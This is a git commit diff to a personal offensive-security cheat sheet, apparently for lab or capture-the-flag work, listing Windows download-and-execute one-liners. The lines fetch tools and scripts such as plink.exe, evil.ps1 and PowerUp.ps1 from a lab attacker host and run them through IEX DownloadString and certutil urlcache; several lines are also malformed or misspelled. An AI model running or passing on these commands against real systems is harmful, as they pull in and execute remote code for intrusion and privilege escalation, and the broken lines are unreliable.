0d9ac5380e7219e890c5db764af68f4cff8a9e98
Ray Ferrufino <52383730+Rayferrufino@users.noreply.github.com>
2019-11-04 21:14:15 -0500

    Update Windows-powershell-donload-files.sh

--- Windows-powershell-donload-files.sh
+++ Windows-powershell-donload-files.sh
@@ -9,3 +9,11 @@ wget http://10.10.14.34/taskkill.exe -UseBasicParsing -OutFile taskkill.exe
 powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.34/plink.exe', 'plink.exe')"
 
 IEX(New-Object Net.WebClient)downloadString('http://IP/evil.ps1')
+
+IEX(New-Object Net.WebClient)downloadString('http://10.10.14.34/ray64.exe')
+
+fexec=echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.34/PowerUp.ps1') | powershell -noprofile
+
+urlcache -f http://x.x.x.x/myfile newfile
+
+cerutil urlcache -f 
